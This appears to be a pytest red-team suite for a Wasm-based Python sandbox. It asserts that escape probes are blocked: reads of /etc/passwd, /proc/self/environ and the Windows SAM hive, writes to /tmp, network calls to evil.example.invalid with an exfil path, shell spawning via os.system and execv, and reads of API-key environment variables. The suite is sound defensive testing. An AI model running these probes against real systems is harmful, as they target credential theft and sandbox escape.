"""Adversarial red-team corpus against the Wasm Python sandbox.

Implements the corpus specified in
`docs/superpowers/specs/2026-04-22-wasm-sandbox-redteam-plan.md`.
Each attack in §2 is expected to be blocked by the sandbox — the
test asserts that:

1. A deny marker (`OSError`, `PermissionError`, `NotImplementedError`,
   etc.) appears in captured stdout/stderr OR the process exits with
   a non-zero code.
2. A host-side `SENTINEL` env var that would be visible to an
   unsandboxed subprocess does NOT leak into the sandbox's stdout
   or stderr.
3. wasmtime itself does not panic or segfault — a failed attack
   should surface as a clean Python exception inside the sandbox,
   never as a host-side crash.

Skip gate: `sage_core.embedded_wasm_available()` — the embedded
RustPython bytes must be bundled. `ToolExecutor.has_wasm()` is
deliberately NOT used as the gate because it only answers for the
Component-Model path, not the `execute_raw`→embedded-RustPython
path these attacks run through.
"""
from __future__ import annotations

import os

import pytest

import sage_core

pytestmark = pytest.mark.skipif(
    not sage_core.embedded_wasm_available(),
    reason="Embedded RustPython wasm bytes not bundled (built without sandbox+cranelift, "
    "or build.rs did not find a compiled rustpython.wasm).",
)

SENTINEL = "sk-sentinel-do-not-leak-2026-04-22"
SENTINEL_VARS = ("OPENAI_API_KEY", "ANTHROPIC_API_KEY", "WASM_REDTEAM_SENTINEL")


@pytest.fixture(scope="module")
def executor():
    # 10-second timeout is plenty for an attack probe; MEM-3's
    # infinite loop proves the timeout fires cleanly.
    ex = sage_core.ToolExecutor(None, 10)
    yield ex


@pytest.fixture(autouse=True)
def _set_sentinel_env(monkeypatch):
    """Set sentinel values on the host BEFORE the sandbox call, and
    enable the SAGE_UNSAFE_RAW_EXEC gate for the duration of the
    test. Clean up on teardown."""
    for var in SENTINEL_VARS:
        monkeypatch.setenv(var, SENTINEL)
    monkeypatch.setenv("SAGE_UNSAFE_RAW_EXEC", "1")
    yield


def _probe(executor, code: str) -> sage_core.ExecResult:
    """Run `code` through execute_raw → embedded RustPython wasm
    sandbox. Returns the ExecResult — caller asserts on it."""
    return executor.execute_raw(code, "{}")


def _assert_blocked(
    result: sage_core.ExecResult,
    deny_markers: tuple[str, ...],
    label: str,
) -> None:
    """Core red-team assertion. The captured output must contain at
    least one deny marker, must not contain the SENTINEL, and the
    harness must not have crashed the wasmtime host."""
    combined = f"{result.stdout}\n{result.stderr}"
    # No SENTINEL in output — this is the STRONGEST assertion. Even
    # if a syscall is denied, a wiring bug that forwarded the host
    # env would leak the sentinel.
    assert SENTINEL not in combined, (
        f"[{label}] SENTINEL leaked into sandbox output!\n"
        f"stdout={result.stdout!r}\nstderr={result.stderr!r}"
    )
    # A deny marker must appear somewhere in captured output OR the
    # probe exited with a non-zero code (wasmtime trap / sys.exit).
    marker_hit = any(m in combined for m in deny_markers)
    nonzero_exit = result.exit_code != 0
    assert marker_hit or nonzero_exit, (
        f"[{label}] attack was NOT blocked.\n"
        f"deny_markers={deny_markers!r}\n"
        f"exit_code={result.exit_code}\n"
        f"stdout={result.stdout!r}\nstderr={result.stderr!r}"
    )


# =====================================================================
# §2.1 Filesystem read escape
# =====================================================================

FS_DENY_MARKERS = ("DENIED:", "OSError", "PermissionError", "FileNotFoundError")


def test_FS1_read_etc_passwd(executor):
    """FS-1: open('/etc/passwd').read() must fail with OSError."""
    code = r"""
try:
    with open("/etc/passwd") as f:
        print("LEAK:", f.read(40))
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout, f"FS-1 READ LEAKED! stdout={r.stdout!r}"
    _assert_blocked(r, FS_DENY_MARKERS, "FS-1")


def test_FS2_read_proc_self_environ(executor):
    """FS-2: /proc/self/environ is a Linux secret-leak vector."""
    code = r"""
try:
    with open("/proc/self/environ", "rb") as f:
        data = f.read(1024)
    print("LEAK:", len(data))
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout
    _assert_blocked(r, FS_DENY_MARKERS, "FS-2")


def test_FS3_read_windows_sam(executor):
    """FS-3: Windows SAM hive (if wasm is mistakenly given C:/ access)."""
    code = r"""
try:
    with open("C:/Windows/System32/config/SAM", "rb") as f:
        data = f.read(16)
    print("LEAK:", data)
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout
    _assert_blocked(r, FS_DENY_MARKERS, "FS-3")


def test_FS4_relative_path_traversal(executor):
    """FS-4: '../../../../etc/passwd' should not escape the sandbox."""
    code = r"""
try:
    with open("../../../../etc/passwd") as f:
        print("LEAK:", f.read(40))
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout
    _assert_blocked(r, FS_DENY_MARKERS, "FS-4")


def test_FS5_os_listdir_root(executor):
    """FS-5: os.listdir('/') must raise."""
    code = r"""
import os
try:
    items = os.listdir("/")
    print("LEAK:", len(items), "items")
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout
    _assert_blocked(r, FS_DENY_MARKERS, "FS-5")


def test_FS6_fdopen_foreign_fd(executor):
    """FS-6: fdopen(3) targets an fd we never granted."""
    code = r"""
import os
try:
    f = os.fdopen(3, "r")
    print("LEAK:", f.read(40))
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout
    _assert_blocked(r, FS_DENY_MARKERS, "FS-6")


def test_FS7_pathlib_iterdir(executor):
    """FS-7: pathlib.Path('/').iterdir() must be denied."""
    code = r"""
import pathlib
try:
    items = list(pathlib.Path("/").iterdir())
    print("LEAK:", len(items))
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout
    _assert_blocked(r, FS_DENY_MARKERS, "FS-7")


def test_FS8_very_long_path(executor):
    """FS-8: 10 000-char path — must not crash wasmtime."""
    code = r"""
try:
    with open("a" * 10000) as f:
        print("LEAK:", f.read(10))
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout
    _assert_blocked(r, FS_DENY_MARKERS, "FS-8")


# =====================================================================
# §2.2 Filesystem write escape
# =====================================================================

def test_FW1_write_tmp_pwn(executor):
    """FW-1: write to /tmp/pwn must fail."""
    code = r"""
try:
    with open("/tmp/pwn", "w") as f:
        f.write("owned")
    print("LEAK: wrote /tmp/pwn")
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout
    _assert_blocked(r, FS_DENY_MARKERS, "FW-1")


def test_FW2_write_cwd(executor):
    """FW-2: cwd is not preopened — write must fail."""
    code = r"""
try:
    with open("output.txt", "w") as f:
        f.write("data")
    print("LEAK: wrote to cwd")
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout
    _assert_blocked(r, FS_DENY_MARKERS, "FW-2")


def test_FW3_mkdir_tmp(executor):
    """FW-3: os.mkdir('/tmp/evil') must fail."""
    code = r"""
import os
try:
    os.mkdir("/tmp/evil")
    print("LEAK: mkdir succeeded")
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout
    _assert_blocked(r, FS_DENY_MARKERS, "FW-3")


def test_FW4_shutil_copy(executor):
    """FW-4: shutil.copyfile exfiltration chain must fail at read or write."""
    code = r"""
try:
    import shutil
    shutil.copyfile("/etc/passwd", "stolen")
    print("LEAK: copy succeeded")
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout
    _assert_blocked(
        r,
        FS_DENY_MARKERS + ("NotImplementedError", "ModuleNotFoundError", "ImportError"),
        "FW-4",
    )


def test_FW5_fcntl_fallback(executor):
    """FW-5: fcntl is Unix-only and not in wasi-p1; must be unusable."""
    code = r"""
try:
    import fcntl
    print("LEAK: fcntl module imported")
    fcntl.fcntl(0, 0)
    print("LEAK: fcntl call succeeded")
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    # fcntl not existing on wasi is itself a sufficient block.
    _assert_blocked(
        r,
        FS_DENY_MARKERS + ("NotImplementedError", "ModuleNotFoundError", "ImportError"),
        "FW-5",
    )


# =====================================================================
# §2.3 Network egress
# =====================================================================

NET_DENY_MARKERS = (
    "DENIED:", "OSError", "URLError", "NotImplementedError",
    "ModuleNotFoundError", "ImportError", "gaierror",
)


def test_NET1_urlopen(executor):
    """NET-1: urllib.request.urlopen must not reach the network."""
    code = r"""
try:
    import urllib.request
    r = urllib.request.urlopen("http://evil.example.invalid/exfil", timeout=2)
    print("LEAK:", r.status)
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout
    _assert_blocked(r, NET_DENY_MARKERS, "NET-1")


def test_NET2_socket_connect(executor):
    """NET-2: raw socket.connect must fail."""
    code = r"""
try:
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect(("evil.example.invalid", 80))
    print("LEAK: socket.connect succeeded")
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout
    _assert_blocked(r, NET_DENY_MARKERS, "NET-2")


def test_NET3_http_client(executor):
    """NET-3: http.client.HTTPConnection must fail."""
    code = r"""
try:
    import http.client
    c = http.client.HTTPConnection("evil.example.invalid", 80, timeout=2)
    c.request("GET", "/")
    resp = c.getresponse()
    print("LEAK:", resp.status)
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout
    _assert_blocked(r, NET_DENY_MARKERS, "NET-3")


def test_NET4_gethostbyname(executor):
    """NET-4: DNS probe must fail (no sockets in wasi-p1)."""
    code = r"""
try:
    import socket
    ip = socket.gethostbyname("evil.example.invalid")
    print("LEAK:", ip)
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout
    _assert_blocked(r, NET_DENY_MARKERS, "NET-4")


def test_NET5_socket_from_fd(executor):
    """NET-5: socket.socket(fileno=3) tries to reuse an unsandboxed fd."""
    code = r"""
try:
    import socket
    s = socket.socket(fileno=3)
    print("LEAK: got socket from fd 3")
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout
    _assert_blocked(r, NET_DENY_MARKERS, "NET-5")


# =====================================================================
# §2.4 Subprocess / process spawn
# =====================================================================

PROC_DENY_MARKERS = (
    "DENIED:", "NotImplementedError", "OSError", "PermissionError",
    "ModuleNotFoundError", "ImportError", "AttributeError",
)


def test_PROC1_os_system(executor):
    """PROC-1: os.system must be a no-op or raise."""
    code = r"""
import os
try:
    rc = os.system("echo PWNED")
    print("LEAK: os.system returned", rc)
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "PWNED" not in r.stdout
    assert "LEAK:" not in r.stdout
    _assert_blocked(r, PROC_DENY_MARKERS, "PROC-1")


def test_PROC2_subprocess_run(executor):
    """PROC-2: subprocess.run must not spawn a child."""
    code = r"""
try:
    import subprocess
    subprocess.run(["ls"], check=False)
    print("LEAK: subprocess.run succeeded")
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout
    _assert_blocked(r, PROC_DENY_MARKERS, "PROC-2")


def test_PROC3_os_fork(executor):
    """PROC-3: os.fork must not exist or must raise."""
    code = r"""
import os
try:
    pid = os.fork()
    print("LEAK: fork returned", pid)
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout
    _assert_blocked(r, PROC_DENY_MARKERS, "PROC-3")


def test_PROC4_os_execv(executor):
    """PROC-4: os.execv must not replace the process image."""
    code = r"""
import os
try:
    os.execv("/bin/sh", ["sh", "-c", "echo PWNED"])
    print("LEAK: execv returned (should never happen)")
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "PWNED" not in r.stdout
    assert "LEAK:" not in r.stdout
    _assert_blocked(r, PROC_DENY_MARKERS, "PROC-4")


# =====================================================================
# §2.5 Environment / secrets (critical — SENTINEL must never leak)
# =====================================================================

def test_ENV1_openai_api_key(executor):
    """ENV-1: OPENAI_API_KEY must be invisible inside the sandbox."""
    code = r"""
import os
v = os.environ.get("OPENAI_API_KEY", "<absent>")
print("env:", v)
"""
    r = _probe(executor, code)
    assert SENTINEL not in r.stdout, f"ENV-1 LEAK: {r.stdout!r}"
    assert "<absent>" in r.stdout or r.exit_code != 0


def test_ENV2_environ_items(executor):
    """ENV-2: os.environ.items() must be empty (or not carry sentinels)."""
    code = r"""
import os
items = list(os.environ.items())
print("count:", len(items))
for k, v in items:
    print("k:", k, "v:", v[:20])
"""
    r = _probe(executor, code)
    assert SENTINEL not in r.stdout + r.stderr, (
        f"ENV-2 SENTINEL leaked via environ.items(): {r.stdout!r}"
    )


def test_ENV3_getenv_path(executor):
    """ENV-3: PATH should be None / empty inside the sandbox."""
    code = r"""
import os
print("PATH:", os.getenv("PATH"))
"""
    r = _probe(executor, code)
    # PATH value from host would be dozens of entries; sandbox
    # should report None.
    assert SENTINEL not in r.stdout
    assert "Program Files" not in r.stdout and "/usr/bin" not in r.stdout


# =====================================================================
# §2.6 Clock / time leaks
# =====================================================================

def test_CLK1_time_time(executor):
    """CLK-1: time.time either raises OR returns a clock that doesn't
    leak the host wall clock. We just require it doesn't crash."""
    code = r"""
try:
    import time
    print("time:", time.time())
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    # Not asserting a hard block — wall-clock leak is low-severity.
    # The important check is that the attack didn't panic wasmtime
    # and the sentinel didn't leak through.
    assert SENTINEL not in r.stdout + r.stderr
    assert r.exit_code in (0, -1, 1), f"CLK-1 exit: {r.exit_code}, stderr={r.stderr!r}"


def test_CLK2_datetime_now(executor):
    """CLK-2: datetime.datetime.now() same behaviour as CLK-1."""
    code = r"""
try:
    import datetime
    print("now:", datetime.datetime.now())
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert SENTINEL not in r.stdout + r.stderr
    assert r.exit_code in (0, -1, 1)


# =====================================================================
# §2.7 Memory / resource exhaustion (must NOT take down the host)
# =====================================================================

def test_MEM1_huge_list_alloc(executor):
    """MEM-1: allocating 10 ** 9 slots must hit the 256 MiB cap, not
    eat host RAM."""
    code = r"""
try:
    x = [0] * (10 ** 9)
    print("LEAK: allocated", len(x))
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    # Either the guest raises MemoryError OR wasmtime traps on grow.
    assert "LEAK:" not in r.stdout
    _assert_blocked(
        r,
        ("DENIED:", "MemoryError", "RuntimeError", "OverflowError"),
        "MEM-1",
    )


def test_MEM2_deep_recursion(executor):
    """MEM-2: deep recursion must raise RecursionError, not segfault."""
    code = r"""
import sys
sys.setrecursionlimit(100000)
def f(n):
    return f(n+1)
try:
    f(0)
    print("LEAK: recursion returned")
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout
    _assert_blocked(
        r,
        ("DENIED:", "RecursionError", "RuntimeError", "MemoryError"),
        "MEM-2",
    )


def test_MEM3_infinite_loop_timeout(executor):
    """MEM-3: infinite loop must be killed by the wasmtime epoch."""
    code = "while True: pass\n"
    r = _probe(executor, code)
    assert r.timed_out or r.exit_code != 0, (
        f"MEM-3 infinite loop was NOT timed out. "
        f"exit_code={r.exit_code} timed_out={r.timed_out}"
    )
    # Duration must be bounded (not hang the harness forever).
    assert r.duration_ms < 30_000, (
        f"MEM-3 took {r.duration_ms}ms — timeout is not firing"
    )


def test_MEM4_threading(executor):
    """MEM-4: threading must be unavailable (wasm32-wasip1 has no threads)."""
    code = r"""
try:
    import threading
    t = threading.Thread(target=lambda: None)
    t.start()
    t.join()
    print("LEAK: threading succeeded")
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout
    _assert_blocked(
        r,
        ("DENIED:", "NotImplementedError", "RuntimeError",
         "ModuleNotFoundError", "ImportError", "OSError"),
        "MEM-4",
    )


# =====================================================================
# §2.8 Introspection + host-bridge probing
# =====================================================================

def test_INTRO1_import_wasmtime_module(executor):
    """INTRO-1: 'wasmtime' module must not be importable inside the
    sandbox (no host bridge). A wasm trap during the import attempt
    is also a valid deny — it means the attack never got a bridge."""
    code = r"""
import sys
try:
    import wasmtime
    print("LEAK: wasmtime imported:", wasmtime)
except BaseException as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout
    assert SENTINEL not in r.stdout + r.stderr
    # Accept either (a) Python-level ImportError / ModuleNotFoundError
    # visible in stdout, or (b) a wasm trap (stderr contains "wasm trap"
    # and exit_code != 0). Both prove no bridge was established.
    deny_ok = (
        "DENIED:" in r.stdout
        or "ModuleNotFoundError" in r.stdout + r.stderr
        or "ImportError" in r.stdout + r.stderr
        or ("wasm trap" in r.stderr and r.exit_code != 0)
    )
    assert deny_ok, (
        f"INTRO-1 not blocked. exit_code={r.exit_code} "
        f"stdout={r.stdout!r} stderr={r.stderr!r}"
    )


def test_INTRO2_ctypes_cdll(executor):
    """INTRO-2: ctypes.CDLL must not preload host libraries."""
    code = r"""
try:
    import ctypes
    lib = ctypes.CDLL("libc.so.6")
    print("LEAK: loaded libc:", lib)
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout
    _assert_blocked(
        r,
        ("DENIED:", "OSError", "NotImplementedError",
         "ModuleNotFoundError", "ImportError", "AttributeError"),
        "INTRO-2",
    )


def test_INTRO3_hidden_os(executor):
    """INTRO-3: builtins.__import__('os', fromlist=['*']) — whatever
    os is available must still reject filesystem ops."""
    code = r"""
import builtins
os_mod = builtins.__import__("os", fromlist=["*"])
try:
    os_mod.listdir("/")
    print("LEAK: os_mod.listdir('/') succeeded")
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout
    _assert_blocked(r, FS_DENY_MARKERS, "INTRO-3")


def test_INTRO4_builtins_open(executor):
    """INTRO-4: __builtins__.__dict__['open'] is the same sandboxed open."""
    code = r"""
# In a module context __builtins__ is a module, not a dict — normalise.
import builtins
open_fn = builtins.__dict__["open"]
try:
    f = open_fn("/etc/passwd")
    print("LEAK:", f.read(10))
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout
    _assert_blocked(r, FS_DENY_MARKERS, "INTRO-4")


def test_INTRO5_wasi_module(executor):
    """INTRO-5: no 'wasi' Python module should be importable."""
    code = r"""
try:
    import wasi
    print("LEAK: wasi module:", wasi)
except Exception as e:
    print("DENIED:", type(e).__name__)
"""
    r = _probe(executor, code)
    assert "LEAK:" not in r.stdout
    _assert_blocked(
        r,
        ("DENIED:", "ModuleNotFoundError", "ImportError"),
        "INTRO-5",
    )


# =====================================================================
# §2.9 Engine-level protections
# =====================================================================

def test_ENG1_sys_exit_zero(executor):
    """ENG-1: sys.exit(0) from user code must surface as exit_code=0."""
    code = "import sys; sys.exit(0)"
    r = _probe(executor, code)
    assert r.exit_code == 0, (
        f"ENG-1 sys.exit(0) should map to exit_code 0, got {r.exit_code}. "
        f"stderr={r.stderr!r}"
    )


def test_ENG2_sys_exit_nonzero(executor):
    """ENG-2: sys.exit(42) must propagate the exact exit code."""
    code = "import sys; sys.exit(42)"
    r = _probe(executor, code)
    assert r.exit_code == 42, (
        f"ENG-2 sys.exit(42) should map to exit_code 42, got {r.exit_code}. "
        f"stderr={r.stderr!r}"
    )


def test_ENG3_embedded_null_bytes(executor):
    """ENG-3: printing embedded NULs must not cause buffer overflow."""
    code = r"""
import sys
sys.stdout.write("before\x00after")
sys.stdout.flush()
print(":end")
"""
    r = _probe(executor, code)
    # Assertion: the harness survived (no wasm panic).
    assert SENTINEL not in r.stdout + r.stderr
    # wasmtime either delivered both halves or trapped; either is
    # fine as long as the host didn't crash.
    assert r.exit_code in (0, -1, 1)


def test_ENG4_very_large_stdout(executor):
    """ENG-4: 10 MiB of print output must be capped at the pipe
    capacity and the host must not OOM."""
    code = r"""
import sys
# Well over the 64 KiB pipe cap — we want to see truncation.
chunk = "x" * 4096
# 10 MiB total.
for _ in range(2560):
    sys.stdout.write(chunk)
sys.stdout.flush()
"""
    r = _probe(executor, code)
    # Stdout is capped at SANDBOX_PIPE_CAPACITY (64 KiB).
    assert len(r.stdout) <= 64 * 1024 + 512, (
        f"ENG-4: stdout not capped, got {len(r.stdout)} bytes"
    )
    # And the host survived without panicking.
    assert SENTINEL not in r.stdout + r.stderr
